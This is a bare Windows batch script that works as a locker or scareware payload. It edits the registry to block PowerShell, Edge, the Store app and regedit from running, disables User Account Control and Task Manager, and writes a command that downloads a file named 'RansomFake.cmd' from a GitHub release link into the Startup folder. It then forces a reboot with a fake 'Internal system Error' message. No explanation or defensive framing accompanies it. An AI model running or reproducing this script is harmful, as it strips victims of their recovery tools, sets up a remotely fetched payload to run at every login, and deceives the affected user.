reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /t 
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /t REG_DWORD  /v "DisallowRun" /reg:32 /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "1" /d "powershell.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "2" /d "run.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "3" /d "msedge.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "4" /d "MicrosoftEdge.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "5" /d "pwsh.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "6" /d "WinStore.App.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /t REG_SZ /v "7" /d "regedit.exe" /f
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /reg:32 /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /REG:32 /d 1
Cd "%UserProfile%\appdata\roaming\Microsoft\Windows\Start Menu\Programs"
mkdir "Startup"
echo "invoke-webrequest -Uri "https://release-assets.githubusercontent.com/github-production-release-asset/1044372019/c040cbc4-fb02-46fb-b8d2-458c872d1d50?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-08-27T12%3A07%3A51Z&rscd=attachment%3B+filename%3DRansomFake.cmd&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-08-27T11%3A07%3A44Z&ske=2025-08-27T12%3A07%3A51Z&sks=b&skv=2018-11-09&sig=0RjGP%2FbDmp%2FGk33X%2B1HgbAmBbcdvaHEoeRm505G4B1o%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1NjI5MzQ5NiwibmJmIjoxNzU2MjkzMTk2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.4xYxMLU0SoVXTO16wMIwOnf82h_ivskq6Qox51zoMaY&response-content-disposition=attachment%3B%20filename%3DRansomFake.cmd&response-content-type=application%2Foctet-stream" -outfile "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup\RansomFake.cmd"" > Regestry.ps1
shutdown /r /t 10 /f /c "Internal system Error"














